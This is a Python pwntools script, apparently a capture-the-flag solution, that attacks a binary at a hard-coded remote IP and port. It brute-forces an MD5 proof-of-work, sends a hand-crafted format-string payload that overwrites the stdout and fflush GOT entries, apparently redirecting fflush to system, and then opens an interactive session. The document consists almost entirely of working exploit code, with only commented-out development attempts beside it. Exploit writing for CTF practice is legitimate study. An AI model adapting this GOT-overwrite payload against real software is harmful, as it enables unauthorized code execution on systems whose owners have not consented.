#!/usr/bin/env python3
from pwn import *
import hashlib, selectors, socket, sys, time, os, random, string

# =========================================================
#                          SETUP                         
# =========================================================
exe = './run.elf'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '46.62.167.155', 31337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

set follow-fork-mode parent

# fmtstr_vuln_1|2|3
break *0x4250de
break *0x4250de
break *0x425192

c
'''.format(**locals())

def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(d1, d2=0):
  io.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return io.recvuntil(d2,drop=True)

# =========================================================
#                         EXPLOITS
# =========================================================
# $ pwn checksec run.elf 
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      Canary found
#     NX:         NX enabled
#     PIE:        No PIE (0x400000)
#     Stripped:   No
#     Debuginfo:  Yes

BITS = 21  # fixed by the binary

def md5_ok(b: bytes) -> bool:
    # Fast integer check for "leading zero bits"
    h = int.from_bytes(hashlib.md5(b).digest(), "big")
    return (h >> (128 - BITS)) == 0

def find_one(prefix_len: int = 12) -> bytes:
    """
    Precompute ONE printable line whose MD5 has 21 leading zero bits.
    Uses a random prefix to avoid reuse collisions on the server.
    Returns the exact bytes to send (no newline).
    """
    alphabet = string.ascii_lowercase + string.digits
    prefix = "g-" + "".join(random.choice(alphabet) for _ in range(prefix_len)) + "-"
    n = 0
    pref_b = prefix.encode()
    while True:
        cand = pref_b + str(n).encode()
        if md5_ok(cand):
            return cand
        n += 1

def exploit():
    global io

    if args.REMOTE:
        t0 = time.time()
        line = find_one()
        md5hex = hashlib.md5(line).hexdigest()
        print(f"[+] Precomputed line: {line!r}")
        print(f"[+] MD5: {md5hex}  (meets {BITS} leading zero bits)")
        print(f"[+] Precompute time: {time.time() - t0:.2f}s")

    io = initialize()
    rop = ROP(exe)

    if args.REMOTE:
        io.send(line + b"\n")

    # payload = b''
    # for i in range(1, 40):
    #     payload += f'{i}-%p|'.encode()

    # sh = 0x671c49
    # payload = fmtstr_payload(30, {elf.sym['stdout']: sh})
    # payload = fmtstr_payload(30, {elf.got['fflush']: elf.plt['system']}, write_size='short')

    payload = b'%7241c%37$lln'      # writes 0x1c49
    payload += b'%31271c%38$lln'    # writes 0x9670
    payload += b'%208c%39$hhn'      # writes 0x40
    payload += b'%39c%40$hhn'       # writes 0x67
    payload = payload.ljust(0x8*7, b'\x00')
    payload += p64(elf.got['stdout'])
    payload += p64(elf.got['fflush'])
    payload += p64(elf.got['fflush']+2)
    payload += p64(elf.got['stdout']+2)

    sla(b'<', b'melloy')
    sla(b'<', payload)

    logleak('fflush@GOT', elf.got['fflush'])

    io.interactive()
    
if __name__ == '__main__':
    exploit()
